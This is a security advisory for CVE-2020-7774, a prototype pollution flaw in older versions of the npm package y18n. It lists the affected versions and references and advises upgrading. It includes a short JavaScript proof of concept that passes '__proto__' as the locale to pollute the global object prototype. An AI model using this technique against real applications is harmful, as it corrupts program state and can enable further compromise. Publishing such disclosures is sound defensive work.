# [H] Prototype Pollution in y18n

## Summary
Severity: High
Advisory: GHSA-c4w7-xm78-47vh
CVE: CVE-2020-7774
CWE: CWE-1321, CWE-20, CWE-915
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2021-03-29
Source: https://github.com/advisories/GHSA-c4w7-xm78-47vh
Type: github-advisory

## Affected
- npm: `y18n` — affected >=0 <3.2.2
- npm: `y18n` — affected >=4.0.0 <4.0.1
- npm: `y18n` — affected >=5.0.0 <5.0.5

## Details
### Overview

The npm package `y18n` before versions 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution. 

### POC

```js
const y18n = require('y18n')();

y18n.setLocale('__proto__');
y18n.updateLocale({polluted: true});

console.log(polluted); // true
```

### Recommendation

Upgrade to version 3.2.2, 4.0.1, 5.0.5 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7774
- https://github.com/yargs/y18n/issues/96
- https://github.com/yargs/y18n/pull/108
- https://github.com/yargs/y18n/commit/90401eea9062ad498f4f792e3fff8008c4c193a3
- https://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25
- https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf
- https://github.com/yargs/y18n
- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1038306
- https://snyk.io/vuln/SNYK-JS-Y18N-1021887
- https://www.oracle.com/security-alerts/cpuApr2021.html
